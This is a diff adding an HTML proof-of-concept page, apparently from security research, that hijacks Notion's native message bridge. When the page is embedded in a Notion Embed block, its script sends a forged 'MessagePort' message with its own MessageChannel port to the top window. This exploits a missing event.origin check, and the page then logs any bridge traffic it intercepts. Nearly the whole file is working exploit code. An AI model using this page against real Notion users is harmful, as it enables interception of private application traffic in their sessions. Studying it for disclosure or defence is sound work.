@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Bridge Hijack PoC</title>
+<style>
+  body { font-family: monospace; background:#111; color:#0f0; padding:12px; font-size:13px; word-break: break-all; }
+  h3 { color:#fff; margin:0 0 8px; }
+  #status { color:#ff0; margin-bottom:10px; }
+  .entry { border-bottom:1px solid #333; padding:6px 0; }
+  .ts { color:#888; }
+</style>
+</head>
+<body>
+<h3>Notion Bridge Hijack PoC</h3>
+<div id="status">Waiting for parent window... (embed this page in a Notion Embed block)</div>
+<div id="log"></div>
+
+<script>
+  const statusEl = document.getElementById('status');
+  const logEl = document.getElementById('log');
+
+  function logEntry(text) {
+    const div = document.createElement('div');
+    div.className = 'entry';
+    const ts = new Date().toISOString().split('T')[1].replace('Z','');
+    div.innerHTML = '<span class="ts">[' + ts + ']</span> ' + text;
+    logEl.prepend(div);
+  }
+
+  try {
+    const channel = new MessageChannel();
+
+    // Listen for anything the (hijacked) native bridge sends us
+    channel.port1.onmessage = (e) => {
+      statusEl.textContent = 'HIJACK CONFIRMED — receiving bridge traffic:';
+      statusEl.style.color = '#f00';
+      let dataStr;
+      try { dataStr = typeof e.data === 'string' ? e.data : JSON.stringify(e.data); }
+      catch (err) { dataStr = String(e.data); }
+      logEntry(dataStr);
+    };
+
+    channel.port1.start();
+
+    // Send our own port to the top window pretending to be the native layer.
+    // No origin is specified on the receiving end (window.onmessage does not
+    // check event.origin), so this works regardless of this iframe's own origin.
+    if (window.top && window.top !== window) {
+      window.top.postMessage('MessagePort', '*', [channel.port2]);
+      logEntry('Sent fake "MessagePort" message to window.top with our own MessageChannel port.');
+      statusEl.textContent = 'Port sent. Waiting to see if native bridge traffic arrives on our port...';
+    } else {
+      statusEl.textContent = 'Not embedded in a parent frame — load this inside a Notion Embed block.';
+    }
+  } catch (err) {
+    statusEl.textContent = 'Error: ' + err.message;
+  }
+</script>
+</body>
+</html>
